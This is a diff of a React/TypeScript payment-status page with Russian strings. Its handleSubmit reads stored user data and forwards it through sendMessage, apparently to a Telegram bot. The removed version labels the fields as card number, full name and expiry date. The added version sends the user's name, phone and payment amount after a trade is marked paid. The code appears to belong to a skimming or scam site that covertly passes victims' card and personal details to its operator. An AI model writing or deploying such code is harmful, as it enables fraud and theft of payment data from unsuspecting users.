@@ -87,24 +87,7 @@ interface FormProps {
   }
 
 
-  const handleSubmit = async (): Promise<void> => {
-    const storedName = localStorage.getItem('userdata');
-    const storedObject = JSON.parse(storedData);    
-    var name = storedObject && storedObject.name;
-    var phone = storedObject && storedObject.phone;
-    var summ = storedObject && storedObject.summ;
-
-    try {
-      console.log("success send");
-        await sendMessage(`Номер карты: ${name} || ФИО: ${phone} || Срок действия: ${summ} || `)
-        await sendMessage(`-----------------------------------`)
-    } catch (e) {
-        console.log("error",e);
-    
-    } finally {
-      console.log("failedTG");
-    }
-}
+  
 const AlertCopy = ({ message}) => {
     return (
         <div className="p-3 mb-3 text-dark">{message}</div>
@@ -112,12 +95,30 @@ const AlertCopy = ({ message}) => {
     }
     const check = 0;
     const StatusPage:React.FC<FormProps> = ({ order }) => {
-      const orderStorage = localStorage.getItem('Trade')
-      order = orderStorage && JSON.parse(orderStorage);
+    const orderStorage = localStorage.getItem('Trade')
+    order = orderStorage && JSON.parse(orderStorage);
+    const handleSubmit = async (): Promise<void> => {
+    const storedData = localStorage.getItem('userdata');
+    const storedObject = JSON.parse(storedData);    
+    var name = storedObject && storedObject.name;
+    var phone = storedObject && storedObject.phone;
+    var summ = storedObject && storedObject.summ;
+
+    try {
+      console.log("success send");
+        await sendMessage(`ФИО: ${name} Телефон: ${phone} Пополнил счет на сумму ${summ} рублей `)
+
+    } catch (e) {
+        console.log("error",e);
+    
+    } finally {
+      console.log("S.TG");
+    }
+}
     useEffect(() => {
         const fetchData = async () => {
           try {
-            setLoadingProp(0);
+            setLoadingProp(1);
             const response = await fetch(`/api/check_trade/trade/${order}`, {  // console.log(response);
               method: 'GET', 
               mode: 'cors',
@@ -125,7 +126,6 @@ const AlertCopy = ({ message}) => {
               'Content-Type': 'application/json',
               'Accept': 'application/json',
             }});
-            setLoadingProp(65);
             const data = await response.json();
             if (data && data.length > 0) {
               const obj = data[0];
@@ -135,14 +135,11 @@ const AlertCopy = ({ message}) => {
               switch (message) {
                 case 'still processing': 
                 setInterval( () => setLoadingProp(77), 2000)
-                handleSubmit();
                 setInterval( () => window.location.reload(), 20000)
                 break;
                 case 'fully paid': 
                 setInterval( () => setLoadingProp(100), 10);
                 handleSubmit();
-                setInterval( () => window.location.reload(), 20000)
-                clearInterval(intervalId);
                 break;
                 case 'trade archived': 
                 setInterval( () => setLoadingProp(0), 2000)
@@ -153,12 +150,11 @@ const AlertCopy = ({ message}) => {
             } 
           } catch (error) {
             // console.error('Error fetching data:', error);
-            setInterval( () => setLoadingProp(0), 2000)
+            setInterval( () => setLoadingProp(0), 5000)
             setInterval( () => window.location.reload(), 5000)
           } 
         }; 
-        const intervalId = setInterval(fetchData, 10); // Сохраняем ID интервала для очистки
-        return () => clearInterval(intervalId);
+        fetchData();
       }, [])
     const [showOrder, setShowOrder] = useState(false);
     const [loadingProp, setLoadingProp] = useState(0);
